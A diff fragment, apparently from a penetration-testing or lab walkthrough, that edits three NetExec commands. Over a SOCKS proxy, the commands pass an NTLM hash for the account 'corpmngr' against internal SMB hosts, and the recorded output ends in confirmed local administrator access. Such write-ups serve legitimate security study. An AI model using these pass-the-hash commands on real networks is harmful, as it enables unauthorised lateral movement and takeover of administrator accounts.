@@ -63,13 +63,13 @@ To discover where the newly acquired credentials grant administrative or local a
 
 ```bash
 # Spraying the NTLM hash across internal targets over SOCKS proxy
-proxychains poetry run nxc smb 192.168.98.2 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
+proxychains poetry run nxc smb 192.168.98.2 -u corpmngr -H 4cb3933610b827a281ec479031128cc6
 # [-] STATUS_LOGON_FAILURE / Access Denied
 
-proxychains poetry run nxc smb 192.168.98.30 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
+proxychains poetry run nxc smb 192.168.98.30 -u corpmngr -H 4cb3933610b827a281ec479031128cc6
 # [-] Target host (Source) - no new administrative vantage
 
-proxychains poetry run nxc smb 192.168.98.120 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
+proxychains poetry run nxc smb 192.168.98.120 -u corpmngr -H 4cb3933610b827a281ec479031128cc6
 # [+] Status: SMB Login Successful (Pwned! / (Pwn3d!) Local Administrator confirmed)
 ```
 
